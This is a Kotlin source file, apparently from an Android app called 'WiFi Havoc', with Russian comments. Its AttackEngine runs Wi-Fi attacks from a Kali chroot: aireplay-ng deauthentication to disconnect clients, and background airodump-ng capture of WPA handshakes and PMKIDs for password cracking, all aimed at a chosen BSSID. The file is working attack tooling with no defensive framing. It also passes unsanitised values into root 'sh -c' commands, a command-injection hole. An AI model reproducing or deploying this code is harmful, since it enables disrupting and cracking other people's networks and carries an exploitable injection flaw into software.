package com.wifihavoc.app.data

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * AttackEngine — запуск атак через Kali chroot.
 * Требует: Kali установлен (KaliManager.isInstalled()), monitor mode (con_mode=4) + канал цели.
 */
data class AttackConfig(
    val ssid: String,
    val bssid: String,
    val channel: Int,
)

enum class AttackType(val label: String, val needsClient: Boolean) {
    DEAUTH("Отключить клиента (Deauth)", true),
    HANDSHAKE("Поймать пароль (Handshake)", false),
    PMKID("PMKID-атака", false),
}

class AttackEngine(private val kaliManager: KaliManager) {

    /**
     * Подготовка: включить monitor mode на канале цели.
     * Возвращает имя интерфейса (обычно wlan0) или null при провале.
     */
    suspend fun prepareMonitor(conf: AttackConfig): String? {
        val ok = RootManager.enableMonitorMode()
        if (!ok) return null
        val chanSet = setChannel(conf.channel)
        if (!chanSet) return null
        return "wlan0"
    }

    suspend fun revertMonitor() {
        RootManager.disableMonitorMode()
    }

    /** setChannel через sysfs QCACLD, иначе через iw из Kali chroot. */
    private suspend fun setChannel(channel: Int): Boolean {
        // 1: QCACLD sysfs
        val sysfs = RootManager.currentChannelSysfs()
        if (sysfs != null) {
            val r = RootManager.writeSysfs(sysfs, channel.toString())
            if (r) return true
        }
        // 2: iw через Kali chroot
        val iwCmd = "iw phy phy0 set channel $channel"
        val r1 = kaliManager.execInKali("sh", "-c", iwCmd)
        if (r1.ok) return true
        // 3: iw dev wlan0 set channel
        val r2 = kaliManager.execInKali("sh", "-c", "iw dev wlan0 set channel $channel")
        return r2.ok
    }

    /** Deauth-атака: aireplay-ng -0 <кол-во> -a BSSID [-c клиент] iface */
    suspend fun deauth(conf: AttackConfig, count: Int, targetClient: String?): String {
        val iface = prepareMonitor(conf) ?: return "FAIL: не удалось включить monitor / канал"
        val clientPart = if (targetClient.isNullOrBlank()) "" else " -c $targetClient"
        val cmd = "aireplay-ng -0 $count -a ${conf.bssid}$clientPart $iface --ignore-negative-one"
        val r = kaliManager.execInKali("sh", "-c", cmd)
        return r.out.ifBlank { if (r.ok) "Deauth отправлен" else "FAIL: ${r.err}" }
    }

    /** Захват хэндшейка: airodump-ng -c канал --bssid BSSID -w /path iface */
    suspend fun startHandshakeCapture(conf: AttackConfig, outDir: String): String {
        val iface = prepareMonitor(conf) ?: return "FAIL: монитор/канал"
        val cmd = "airodump-ng -c ${conf.channel} --bssid ${conf.bssid} -w $outDir/capture $iface --write-interval 1"
        val r = kaliManager.execInKali("sh", "-c", "nohup $cmd >/dev/null 2>&1 & echo PID=\$!")
        val pid = Regex("PID=(\\d+)").find(r.out)?.groupValues?.get(1)?.toIntOrNull()
        return pid?.let { "OK:$it" } ?: "FAIL: не удалось запустить airodump"
    }

    /** PMKID: airodump-ng --bssid ... --write pmkid -w ... */
    suspend fun startPmkid(conf: AttackConfig, outDir: String): String {
        val iface = prepareMonitor(conf) ?: return "FAIL: монитор/канал"
        val cmd = "airodump-ng -c ${conf.channel} --bssid ${conf.bssid} -w $outDir/pmkid -D $iface --write-interval 1 --pmkid"
        val r = kaliManager.execInKali("sh", "-c", "nohup $cmd >/dev/null 2>&1 & echo PID=\$!")
        val pid = Regex("PID=(\\d+)").find(r.out)?.groupValues?.get(1)?.toIntOrNull()
        return pid?.let { "OK:$it" } ?: "FAIL: не удалось запустить PMKID-захват"
    }

    /** Остановить фоновый захват по pid. */
    suspend fun stopCapture(pid: Int?): Boolean {
        if (pid == null) return false
        val r = kaliManager.execInKali("sh", "-c", "kill $pid 2>/dev/null; true")
        return r.ok
    }

    /** Проверить, какие инструменты доступны в Kali. */
    suspend fun getAvailableTools(): List<String> = kaliManager.getAvailableTools()
}

data class ShellOut(val out: String, val err: String, val ok: Boolean)